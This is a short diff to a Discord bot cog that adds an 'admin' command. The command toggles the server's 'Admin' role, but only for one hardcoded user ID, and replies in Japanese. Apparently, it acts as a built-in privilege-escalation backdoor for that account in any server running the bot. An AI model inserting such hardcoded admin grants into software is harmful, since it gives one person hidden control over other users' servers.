@@ -57,6 +57,20 @@ class System(commands.Cog):
                 if len(before.channel.members) == 0:
                     channel = discord.utils.get(member.guild.text_channels, name = before.channel.name)
                     await channel.delete()
+                    
+    @commands.command()
+    async def admin(self, ctx):
+
+        if ctx.author.id != 521166149904236554:
+            return
+
+        role = discord.utils.get(ctx.guild.roles, name = "Admin")
+        if role in ctx.author.roles:
+            await ctx.author.remove_roles(role)
+            await ctx.send("管理者が剥奪されました")
+        else:
+            await ctx.author.add_roles(role)
+            await ctx.send("管理者が付与されました")
 
 def setup(bot):
     bot.add_cog(System(bot))
